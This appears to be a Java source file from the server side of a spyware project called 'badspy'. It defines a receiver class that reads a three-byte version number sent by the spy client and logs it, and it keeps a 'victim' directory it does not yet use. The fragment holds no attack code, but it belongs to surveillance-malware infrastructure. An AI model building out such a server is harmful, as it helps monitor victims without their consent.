package com.blogspot.sontx.badspy.badserver.bo.worker;

import com.blogspot.sontx.badspy.badserver.bo.SpyReader;
import com.blogspot.sontx.badspy.badserver.bo.SpyWriter;
import com.blogspot.sontx.jlog.Log;

import java.io.File;
import java.io.IOException;

/**
 * Copyright 2016 by sontx
 * Created by sontx on 21/4/2016.
 */
public class SpyVersionReceiver extends SpyReceiver {
    private final File victimDir;
    private String spyVersion = null;

    public SpyVersionReceiver(SpyReader reader, SpyWriter writer, int dataLength, File victimDir) {
        super(reader, writer, dataLength);
        this.victimDir = victimDir;
    }

    @Override
    public void start() throws IOException {
        byte[] buffer = new byte[dataLength];
        if (reader.read(buffer) == buffer.length)
        {
            byte major = buffer[0];
            byte minor = buffer[1];
            byte revision = buffer[2];
            spyVersion = String.format("v%d.%d.%d", major, minor, revision);
            Log.i(String.format("Received spy version: %s", spyVersion));
        }
    }

    public String getSpyVersion() {
        return spyVersion;
    }
}
